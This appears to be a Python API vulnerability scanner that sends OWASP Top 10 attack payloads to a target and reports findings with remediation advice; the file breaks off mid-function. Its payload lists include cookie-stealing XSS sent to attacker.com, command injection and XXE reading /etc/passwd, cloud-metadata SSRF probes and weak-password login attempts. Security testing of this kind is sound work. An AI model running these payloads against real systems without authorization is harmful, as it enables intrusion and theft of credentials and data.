#!/usr/bin/env python3
"""
API Vulnerability Scanner - Ghost Ops Security
Comprehensive API security testing tool for attack surface mapping and OWASP Top 10 testing
"""

import requests
import json
import time
import re
import argparse
import urllib.parse
from typing import Dict, List, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

@dataclass
class Finding:
    """Data class for vulnerability findings"""
    endpoint: str
    method: str
    vulnerability_type: str
    severity: str
    description: str
    payload: str
    response_code: int
    evidence: str
    remediation: str
    timestamp: str

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class APIVulnScanner:
    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.proxy = proxy
        self.threads = threads
        self.findings: List[Finding] = []
        self.endpoints: List[Dict] = []
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # OWASP Top 10 payloads
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        """Load OWASP API Security Top 10 2023 attack payloads"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' OR 'x'='x",
                "1; DROP TABLE users--",
                "' OR 1=1#",
                "' WAITFOR DELAY '0:0:5'--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
            ],
            'command_injection': [
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& whoami",
                "; ping -c 4 127.0.0.1",
                "`whoami`",
                "$(whoami)",
                "; sleep 5",
                "| sleep 5 #"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "/etc/passwd",
                "../../../../../../etc/passwd%00",
                "....\/....\/....\/etc/passwd"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
            ],
            'ssrf': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://127.1",
                "http://0.0.0.0",
                "http://metadata.google.internal/computeMetadata/v1/"
            ],
            'idor': [
                "1", "2", "100", "999", "0", "-1", "admin", "test"
            ],
            'nosqli': [
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                '{"username":{"$ne":null},"password":{"$ne":null}}',
                '{"$where":"sleep(5000)"}',
                '{"$or":[{},{"a":"a"}]}'
            ],
            'jwt_attacks': [
                'none',  # Algorithm confusion
                'HS256'  # Algorithm downgrade
            ],
            'mass_assignment': [
                '{"isAdmin":true}',
                '{"role":"admin"}',
                '{"permission":"admin"}',
                '{"admin":1}'
            ]
        }

    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║       API Vulnerability Scanner - Ghost Ops Security      ║
║          OWASP API Security Top 10 2023 Testing           ║
╚═══════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}[*] Target: {self.base_url}
[*] Threads: {self.threads}
[*] Framework: OWASP API Security Top 10 2023
[*] Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.END}
"""
        print(banner)

    def discover_endpoints(self, wordlist: List[str] = None) -> List[Dict]:
        """Discover API endpoints through fuzzing"""
        print(f"\n{Colors.BOLD}[+] Phase 1: Attack Surface Mapping{Colors.END}")
        
        common_endpoints = wordlist or [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin',
            '/api/v1/login', '/api/login', '/api/auth/login',
            '/api/v1/register', '/api/register',
            '/api/v1/profile', '/api/profile',
            '/api/v1/upload', '/api/upload',
            '/api/v1/download', '/api/download',
            '/api/v1/search', '/api/search',
            '/api/v1/products', '/api/products',
            '/api/v1/orders', '/api/orders',
            '/api/v1/config', '/api/config',
            '/api/v1/settings', '/api/settings',
            '/api/v1/logs', '/api/logs',
            '/api/v1/backup', '/api/backup',
            '/api/v1/export', '/api/export',
            '/api/v1/import', '/api/import',
            '/api/v1/docs', '/api/docs', '/api/swagger',
            '/api/v1/health', '/api/health',
            '/api/v1/status', '/api/status',
            '/graphql', '/api/graphql',
            '/.git/config', '/.env', '/api/.env'
        ]
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        discovered = []
        
        print(f"{Colors.YELLOW}[*] Fuzzing {len(common_endpoints)} endpoints with {len(methods)} methods...{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for endpoint in common_endpoints:
                for method in methods:
                    futures.append(executor.submit(self._test_endpoint, endpoint, method))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    discovered.append(result)
                    print(f"{Colors.GREEN}[✓] Found: {result['method']} {result['endpoint']} (HTTP {result['status']}){Colors.END}")
        
        self.endpoints = discovered
        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Discovered {len(discovered)} active endpoints{Colors.END}\n")
        return discovered

    def _test_endpoint(self, endpoint: str, method: str) -> Dict:
        """Test if an endpoint exists"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(
                method=method,
                url=url,
                timeout=10,
                verify=False,
                allow_redirects=False,
                proxies=self.proxy
            )
            
            # Consider endpoint as found if not 404
            if response.status_code != 404:
                return {
                    'endpoint': endpoint,
                    'method': method,
                    'status': response.status_code,
                    'content_type': response.headers.get('Content-Type', ''),
                    'length': len(response.content)
                }
        except Exception as e:
            pass
        return None

    def fuzz_parameters(self, endpoint_data: Dict):
        """Fuzz endpoint parameters"""
        print(f"\n{Colors.BOLD}[+] Phase 2: Parameter Fuzzing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
        
        common_params = [
            'id', 'user', 'username', 'email', 'password', 'token',
            'file', 'filename', 'path', 'url', 'redirect', 'callback',
            'search', 'query', 'q', 'page', 'limit', 'offset',
            'admin', 'role', 'permission', 'debug', 'test'
        ]
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        found_params = []
        
        for param in common_params:
            test_data = {param: "test123"}
            try:
                if endpoint_data['method'] == 'GET':
                    response = self.session.get(url, params=test_data, timeout=5, verify=False, proxies=self.proxy)
                else:
                    response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
                
                # Check if parameter affected response
                if response.status_code != 404 and response.status_code != 405:
                    found_params.append(param)
                    print(f"{Colors.GREEN}[✓] Found parameter: {param}{Colors.END}")
                    
            except Exception:
                pass
        
        return found_params

    def test_sql_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for SQL Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SQL Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['sqli']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    # Detection patterns
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'syntax error', 'unclosed quotation', 'quoted string',
                        'database error', 'warning: mysql', 'pg_query()',
                        'sqlstate', 'db2 sql error', 'odbc driver'
                    ]
                    
                    response_text = response.text.lower()
                    
                    for error in sql_errors:
                        if error in response_text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='SQL Injection',
                                severity='CRITICAL',
                                description=f'SQL injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'SQL error pattern detected: {error}',
                                remediation='Use parameterized queries/prepared statements. Implement input validation and sanitization.'
                            )
                            print(f"{Colors.RED}[!] SQL Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    # Time-based detection
                    if 'WAITFOR' in payload or 'sleep' in payload.lower():
                        if response.elapsed.total_seconds() > 4:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Blind SQL Injection (Time-based)',
                                severity='CRITICAL',
                                description=f'Time-based blind SQL injection detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Response delayed by {response.elapsed.total_seconds():.2f} seconds',
                                remediation='Use parameterized queries/prepared statements. Implement input validation.'
                            )
                            print(f"{Colors.RED}[!] Blind SQL Injection (time-based) found in parameter: {param}{Colors.END}")
                
                except Exception as e:
                    pass

    def test_xss(self, endpoint_data: Dict, params: List[str]):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing XSS...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['xss']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    # Check if payload reflected in response
                    if payload in response.text or urllib.parse.quote(payload) in response.text:
                        # Additional verification
                        if '<script>' in response.text.lower() or 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Cross-Site Scripting (XSS)',
                                severity='HIGH',
                                description=f'XSS vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence='Payload reflected in response without proper encoding',
                                remediation='Implement output encoding, Content Security Policy (CSP), and input validation.'
                            )
                            print(f"{Colors.RED}[!] XSS found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_command_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for Command Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Command Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['command_injection']:
                test_data = {param: payload}
                
                try:
                    start_time = time.time()
                    
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=15, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=15, verify=False, proxies=self.proxy)
                    
                    elapsed = time.time() - start_time
                    
                    # Detection patterns
                    cmd_patterns = [
                        'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
                        'uid=', 'gid=', '[boot loader]', 'PING', '64 bytes from'
                    ]
                    
                    for pattern in cmd_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Command Injection',
                                severity='CRITICAL',
                                description=f'Command injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Command output detected in response: {pattern}',
                                remediation='Avoid system calls. Use safe APIs. Implement strict input validation and whitelist allowed commands.'
                            )
                            print(f"{Colors.RED}[!] Command Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    # Time-based detection for sleep commands
                    if 'sleep' in payload and elapsed > 4:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='Blind Command Injection',
                            severity='CRITICAL',
                            description=f'Time-based command injection detected in parameter "{param}"',
                            payload=payload,
                            response_code=response.status_code,
                            evidence=f'Response delayed by {elapsed:.2f} seconds',
                            remediation='Avoid system calls. Use safe APIs. Implement strict input validation.'
                        )
                        print(f"{Colors.RED}[!] Blind Command Injection found in parameter: {param}{Colors.END}")
                
                except Exception:
                    pass

    def test_path_traversal(self, endpoint_data: Dict, params: List[str]):
        """Test for Path Traversal vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Path Traversal...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['path_traversal']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    # Detection patterns
                    traversal_patterns = [
                        'root:', 'bin:', 'daemon:',
                        '[boot loader]', '[operating systems]',
                        '; for 16-bit app support'
                    ]
                    
                    for pattern in traversal_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Path Traversal',
                                severity='HIGH',
                                description=f'Path traversal vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'System file content detected: {pattern}',
                                remediation='Implement strict path validation. Use whitelist of allowed paths. Avoid direct file access.'
                            )
                            print(f"{Colors.RED}[!] Path Traversal found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_ssrf(self, endpoint_data: Dict, params: List[str]):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SSRF...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['ssrf']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    # Detection patterns for cloud metadata
                    ssrf_patterns = [
                        'ami-id', 'instance-id', 'security-credentials',
                        'computeMetadata', 'latest/meta-data', 'AccessKeyId'
                    ]
                    
                    for pattern in ssrf_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Server-Side Request Forgery (SSRF)',
                                severity='CRITICAL',
                                description=f'SSRF vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Internal/cloud metadata accessible: {pattern}',
                                remediation='Implement URL whitelist. Disable redirects. Use separate networks for internal services.'
                            )
                            print(f"{Colors.RED}[!] SSRF found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_broken_object_level_authorization(self, endpoint_data: Dict, params: List[str]):
        """API1:2023 - Test for Broken Object Level Authorization (BOLA)"""
        print(f"{Colors.YELLOW}[*] Testing API1:2023 - Broken Object Level Authorization (BOLA)...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        # Only test if endpoint likely has object references
        if not any(keyword in endpoint_data['endpoint'].lower() for keyword in ['user', 'profile', 'account', 'order', 'document', 'file', 'message', 'post', 'comment', 'transaction']):
            return
        
        for param in params:
            if param.lower() in ['id', 'user', 'userid', 'accountid', 'orderid', 'documentid', 'fileid', 'messageid', 'postid', 'commentid']:
                responses = {}
                status_codes = {}
                
                # Test with various object IDs
                for test_id in self.payloads['idor']:
                    test_data = {param: test_id}
                    
                    try:
                        if endpoint_data['method'] == 'GET':
                            response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                        else:
                            response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                        
                        # Store successful responses
                        if response.status_code == 200:
                            responses[test_id] = {
                                'length': len(response.content),
                                'content_sample': response.text[:200]
                            }
                            status_codes[test_id] = response.status_code
                    
                    except Exception:
                        pass
                
                # If we got different content for different IDs, potential BOLA
                if len(responses) > 1:
                    content_lengths = [r['length'] for r in responses.values()]
                    # Check if we got varying content (not all the same error page)
                    if len(set(content_lengths)) > 1:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='API1:2023 - Broken Object Level Authorization (BOLA)',
                            severity='CRITICAL',
                            description=f'BOLA vulnerability detected - unauthorized access to other users\' objects via parameter "{param}". API does not validate user ownership of requested objects.',
                            payload=', '.join(responses.keys()),
                            response_code=200,
                            evidence=f'Multiple object IDs ({len(responses)}) accessible without proper authorization. Different content returned for different IDs indicating access to different user data.',
                            remediation='Implement object-level authorization checks. Verify that the logged-in user has permission to access the requested object. Use random, unpredictable IDs instead of sequential integers.'
                        )
                        print(f"{Colors.RED}[!] BOLA (API1:2023) found in parameter: {param}{Colors.END}")

    def test_security_headers(self):
        """Test for missing security headers"""
        print(f"\n{Colors.YELLOW}[*] Testing Security Headers...{Colors.END}")
        
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False, proxies=self.proxy)
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME-sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter',
                'Referrer-Policy': 'Referrer leakage protection'
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(f"{header} ({description})")
            
            if missing_headers:
                self._add_finding(
                    endpoint=self.base_url,
                    method='GET',
                    vuln_type='Missing Security Headers',
                    severity='MEDIUM',
                    description='Critical security headers are missing',
                    payload='N/A',
                    response_code=response.status_code,
                    evidence=f"Missing headers: {', '.join(missing_headers)}",
                    remediation='Implement all security headers with appropriate values.'
                )
                print(f"{Colors.YELLOW}[!] Missing security headers detected{Colors.END}")
        
        except Exception:
            pass

    def test_xxe(self, endpoint_data: Dict):
        """Test for XML External Entity vulnerabilities"""
        if 'xml' not in endpoint_data.get('content_type', '').lower():
            return
        
        print(f"{Colors.YELLOW}[*] Testing XXE...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for payload in self.payloads['xxe']:
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/xml'
                
                response = self.session.request(
                    endpoint_data['method'],
                    url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    proxies=self.proxy
                )
                
                xxe_patterns = ['root:', 'bin:', 'daemon:', '[boot loader]']
                
                for pattern in xxe_patterns:
                    if pattern in response.text:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='XML External Entity (XXE)',
                            severity='CRITICAL',
                            description='XXE vulnerability allows reading local files',
                            payload=payload[:100] + '...',
                            response_code=response.status_code,
                            evidence=f'Local file content detected: {pattern}',
                            remediation='Disable external entity processing in XML parser. Use less complex data formats like JSON.'
                        )
                        print(f"{Colors.RED}[!] XXE vulnerability found{Colors.END}")
                        break
            
            except Exception:
                pass

    def test_broken_object_property_authorization(self, endpoint_data: Dict, params: List[str]):
        """API3:2023 - Test for Broken Object Property Level Authorization (Mass Assignment + Excessive Data Exposure)"""
        print(f"{Colors.YELLOW}[*] Testing API3:2023 - Broken Object Property Level Authorization...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        # Test Mass Assignment - adding unauthorized properties
        mass_assignment_payloads = [
            {"isAdmin": True, "role": "admin"},
            {"admin": True, "role": "administrator"},
            {"permission": "admin", "privileges": "all"},
            {"isActive": True, "verified": True},
            {"balance": 99999, "credits": 99999},
            {"discount": 100, "price": 0}
        ]
        
        if endpoint_data['method'] in ['POST', 'PUT', 'PATCH']:
            for payload in mass_assignment_payloads:
                # Merge with existing params
                test_data = {param: "test" for param in params}
                test_data.update(payload)
                
                try:
                    response = self.session.request(
                        endpoint_data['method'],
                        url,
                        json=test_data,
                        timeout=10,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    # Check if server accepted unauthorized properties
                    if response.status_code in [200, 201, 204]:
                        response_lower = response.text.lower()
                        # Check if our malicious properties appear in response
                        for key in payload.keys():
                            if key.lower() in response_lower:
                                self._add_finding(
                                    endpoint=endpoint_data['endpoint'],
                                    method=endpoint_data['method'],
                                    vuln_type='API3:2023 - Broken Object Property Level Authorization (Mass Assignment)',
                                    severity='HIGH',
                                    description=f'Mass assignment vulnerability detected. API accepts and processes unauthorized property "{key}" without proper authorization checks.',
                                    payload=json.dumps(payload),
                                    response_code=response.status_code,
                                    evidence=f'Property "{key}" was accepted and reflected in response. This could allow privilege escalation or unauthorized data modification.',
                                    remediation='Use allowlist of properties that clients are allowed to modify. Implement property-level authorization. Use DTOs/schemas to define allowed properties explicitly.'
                                )
                                print(f"{Colors.RED}[!] Mass Assignment (API3:2023) found - unauthorized property: {key}{Colors.END}")
                                break
                
                except Exception:
                    pass
        
        # Test Excessive Data Exposure - check if API returns sensitive fields
        if endpoint_data['method'] == 'GET':
            try:
                response = self.session.get(url, timeout=10, verify=False, proxies=self.proxy)
                
                if response.status_code == 200:
                    response_lower = response.text.lower()
                    sensitive_fields = [
                        'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey',
                        'private_key', 'access_token', 'refresh_token', 'ssn', 'social_security',
                        'credit_card', 'cvv', 'pin', 'salt', 'hash'
                    ]
                    
                    found_sensitive = []
                    for field in sensitive_fields:
                        if field in response_lower:
                            found_sensitive.append(field)
                    
                    if found_sensitive:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='API3:2023 - Broken Object Property Level Authorization (Excessive Data Exposure)',
                            severity='HIGH',
                            description=f'API exposes sensitive data fields that should not be returned to clients.',
                            payload='N/A',
                            response_code=response.status_code,
                            evidence=f'Sensitive fields detected in response: {", ".join(found_sensitive[:5])}. API may be returning full objects without filtering.',
                            remediation='Implement response filtering. Only return properties that the client needs. Use DTOs to control what data is exposed. Never return sensitive fields like passwords or tokens.'
                        )
                        print(f"{Colors.RED}[!] Excessive Data Exposure (API3:2023) - sensitive fields: {', '.join(found_sensitive[:3])}{Colors.END}")
            
            except Exception:
                pass

    def test_broken_function_level_authorization(self, endpoint_data: Dict):
        """API5:2023 - Test for Broken Function Level Authorization"""
        print(f"{Colors.YELLOW}[*] Testing API5:2023 - Broken Function Level Authorization...{Colors.END}")
        
        # Check if endpoint contains admin/privileged function indicators
        admin_indicators = ['admin', 'delete', 'remove', 'destroy', 'modify', 'update', 'create', 'add', 'manage']
        
        if not any(indicator in endpoint_data['endpoint'].lower() for indicator in admin_indicators):
            return
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        # Try accessing without authentication or with regular user credentials
        try:
            # Remove authentication headers to test unauthorized access
            headers_no_auth = {k: v for k, v in self.headers.items() if 'auth' not in k.lower() and 'token' not in k.lower()}
            
            response = requests.request(
                endpoint_data['method'],
                url,
                headers=headers_no_auth,
                timeout=10,
                verify=False,
                proxies=self.proxy
            )
            
            # If we get 200 instead of 401/403, potential BFLA
            if response.status_code in [200, 201, 204]:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='API5:2023 - Broken Function Level Authorization (BFLA)',
                    severity='CRITICAL',
                    description='Administrative/privileged function accessible without proper authorization. Regular users may be able to perform administrative actions.',
                    payload='Request without authentication headers',
                    response_code=response.status_code,
                    evidence=f'Administrative endpoint {endpoint_data["endpoint"]} returned {response.status_code} without proper authorization headers.',
                    remediation='Implement function-level authorization checks. Verify user roles before executing administrative functions. Deny access by default and require explicit authorization for privileged operations.'
                )
                print(f"{Colors.RED}[!] Broken Function Level Authorization (API5:2023) - admin endpoint accessible{Colors.END}")
        
        except Exception:
            pass

    def test_broken_authentication(self):
        """API2:2023 - Test for Broken Authentication vulnerabilities"""
        print(f"\n{Colors.YELLOW}[*] Testing API2:2023 - Broken Authentication...{Colors.END}")
        
        auth_endpoints = [ep for ep in self.endpoints if any(x in ep['endpoint'].lower() for x in ['login', 'auth', 'signin', 'token', 'password'])]
        
        for endpoint_data in auth_endpoints:
            url = f"{self.base_url}{endpoint_data['endpoint']}"
            
            # Test weak password acceptance
            weak_passwords = ['123456', 'password', 'admin', '12345678', 'qwerty', 'abc123']
            for pwd in weak_passwords:
                test_data = {'username': 'admin', 'password': pwd}
                
                try:
                    response = self.session.post(url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    # If weak password accepted (200 or token in response)
                    if response.status_code == 200 or 'token' in response.text.lower():
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method='POST',
                            vuln_type='API2:2023 - Broken Authentication (Weak Password)',
                            severity='CRITICAL',
                            description='API accepts weak passwords without proper validation.',
                            payload=f"username: admin, password: {pwd}",
                            response_code=response.status_code,
                            evidence=f'Weak password "{pwd}" was accepted by the authentication endpoint.',
                            remediation='Implement strong password policies. Require minimum length, complexity. Use password strength meters. Reject commonly used passwords.'
                        )
                        print(f"{Colors.RED}[!] Weak password accepted (API2:2023): {pwd}{Colors.END}")
                        break
                
                except Exception:
                    pass
            
            # Test for credential stuffing vulnerability (lack of rate limiting on auth)
            # This is part of API4:2023 but specifically for auth endpoints
            attempts = 0
            for i in range(15):  # Try 15 rapid requests
                try:
                    test_data = {'username': f'user{i}', 'password': 'test123'}
                    response = self.session.post(url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
                    if response.status_code not in [429, 403]:  # Not rate limited
                        attempts += 1
                except Exception:
                    break
            
            if attempts >= 10:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method='POST',
                    vuln_type='API2:2023 - Broken Authentication (No Rate Limiting)',
                    severity='HIGH',
                    description='Authentication endpoint lacks rate limiting, enabling brute-force and credential stuffing attacks.',
                    payload='Multiple rapid authentication attempts',
                    response_code=200,
                    evidence=f'Successfully made {attempts} authentication attempts without being rate-limited or blocked.',
                    remediation='Implement rate limiting on authentication endpoints. Use CAPTCHA after failed attempts. Implement account lockout mechanisms. Monitor for suspicious authentication patterns.'
                )
                print(f"{Colors.RED}[!] No rate limiting on auth endpoint (API2:2023){Colors.END}")

    def test_unrestricted_resource_consumption(self):
        """API4:2023 - Test for Unrestricted Resource Consumption"""
        print(f"\n{Colors.YELLOW}[*] Testing API4:2023 - Unrestricted Resource Consumption...{Colors.END}")
        
        # Test rate limiting on various endpoints
        for endpoint_data in self.endpoints[:3]:  # Test first 3 endpoints
            url = f"{self.base_url}{endpoint_data['endpoint']}"
            
            # Make rapid requests to test rate limiting
            attempts = 0
            rate_limited = False
            
            for i in range(50):  # 50 rapid requests
                try:
                    response = self.session.request(
                        endpoint_data['method'],
                        url,
                        timeout=5,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    if response.status_code == 429:  # Rate limited
                        rate_limited = True
                        break
                    
                    if response.status_code not in [404, 500, 502, 503]:
                        attempts += 1
                
                except Exception:
                    break
            
            # If we made many requests without rate limiting
            if attempts >= 30 and not rate_limited:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='API4:2023 - Unrestricted Resource Consumption',
                    severity='MEDIUM',
                    description='API endpoint lacks proper rate limiting, allowing unrestricted resource consumption.',
                    payload='50 rapid requests',
                    response_code=200,
                    evidence=f'Successfully made {attempts} requests without rate limiting (HTTP 429). This could lead to DoS or excessive operational costs.',
                    remediation='Implement rate limiting per user/IP. Set maximum request quotas. Monitor resource usage. Implement throttling for expensive operations. Use API gateways with built-in rate limiting.'
                )
                print(f"{Colors.YELLOW}[!] No rate limiting detected (API4:2023) on {endpoint_data['endpoint']}{Colors.END}")
                break

    def test_unsafe_api_consumption(self, endpoint_data: Dict, params: List[str]):
        """API10:2023 - Test for Unsafe Consumption of APIs"""
        print(f"{Colors.YELLOW}[*] Testing API10:2023 - Unsafe Consumption of APIs...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        # Test if API accepts data from external sources without validation
        malicious_payloads = [
            {"url": "http://malicious-api.com/data"},
            {"callback": "http://attacker.com/webhook"},
            {"api_endpoint": "http://evil.com/api"},
            {"webhook": "http://attacker-site.com/hook"}
        ]
        
        for param in params:
            if any(keyword in param.lower() for keyword in ['url', 'callback', 'webhook', 'api', 'endpoint', 'source']):
                for payload in malicious_payloads:
                    test_data = {param: list(payload.values())[0]}
                    
                    try:
                        if endpoint_data['method'] == 'GET':
                            response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                        else:
                            response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                        
                        # Check if API processed the external URL
